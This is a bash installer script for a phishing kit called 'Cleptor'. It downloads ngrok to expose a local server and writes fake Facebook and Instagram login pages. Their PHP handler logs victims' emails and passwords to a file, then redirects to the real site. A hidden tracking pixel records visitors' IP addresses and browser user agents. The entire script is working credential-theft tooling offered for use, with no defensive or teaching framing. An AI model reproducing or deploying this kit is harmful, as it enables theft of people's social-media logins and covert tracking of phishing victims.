#!/bin/bash

# Cleptor Installer Script

set -e

echo "\n🔧 Cleptor Control Panel Installer"

# Update system
sudo apt update && sudo apt install -y python3 python3-pip php unzip curl

# Install Python packages
pip3 install flask requests

# Setup project folders
mkdir -p logs templates websites/facebook websites/instagram

touch logs/creds.txt logs/ip.txt

# Add ngrok download if not already present
if [ ! -f "ngrok" ]; then
  echo "\n⬇️  Downloading ngrok..."
  curl -s https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-amd64.zip -o ngrok.zip
  unzip ngrok.zip
  rm ngrok.zip
  chmod +x ngrok
fi

# Prompt for ngrok token
read -p "\n🔑 Enter your Ngrok Auth Token: " TOKEN
./ngrok config add-authtoken $TOKEN

echo "\n📁 Installing sample phishing pages..."

# Sample Facebook Page
cat > websites/facebook/index.html <<EOF
<form action="login.php" method="post">
  <input type="text" name="email" placeholder="Email"><br>
  <input type="password" name="pass" placeholder="Password"><br>
  <button type="submit">Log In</button>
</form>
<img src="ip.php" width="1" height="1">
EOF

# Sample Instagram Page
cat > websites/instagram/index.html <<EOF
<form action="login.php" method="post">
  <input type="text" name="email" placeholder="Username"><br>
  <input type="password" name="pass" placeholder="Password"><br>
  <button type="submit">Log In</button>
</form>
<img src="ip.php" width="1" height="1">
EOF

# Shared login.php
cat > websites/facebook/login.php <<'PHP'
<?php
if (isset($_POST['email']) && isset($_POST['pass'])) {
  $email = $_POST['email'];
  $pass = $_POST['pass'];
  $log = "Email: $email | Pass: $pass\n";
  file_put_contents("../../logs/creds.txt", $log, FILE_APPEND);
  header("Location: https://facebook.com");
  exit();
} else {
  echo "No credentials received.";
}
?>
PHP

cp websites/facebook/login.php websites/instagram/login.php

# Shared ip.php
cat > websites/facebook/ip.php <<'PHP'
<?php
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$log = "IP: $ip | Agent: $ua\n";
file_put_contents("../../logs/ip.txt", $log, FILE_APPEND);
?>
<img src="#" width="1" height="1">
PHP

cp websites/facebook/ip.php websites/instagram/ip.php

# Improved login.html UI
cat > templates/login.html <<EOF
<!DOCTYPE html>
<html>
<head>
  <title>Login - Cleptor</title>
  <style>
    body {
      background: #0d1117;
      font-family: 'Courier New', monospace;
      color: #00ff88;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      background: #111;
      padding: 2rem;
      border: 1px solid #00ff88;
      box-shadow: 0 0 10px #00ff88;
    }
    input {
      width: 100%;
      padding: 0.5rem;
      background: #000;
      border: 1px solid #00ff88;
      color: #00ff88;
      margin-bottom: 1rem;
    }
    button {
      background: #00ff88;
      color: #000;
      border: none;
      padding: 0.5rem 1rem;
      cursor: pointer;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <form method="POST">
      <h2>🔐 Admin Login</h2>
      <input type="password" name="password" placeholder="Enter Password" required>
      <button type="submit">Login</button>
    </form>
  </div>
</body>
</html>
EOF

echo "\n✅ Installation Complete. Run with: python3 launcher.py"
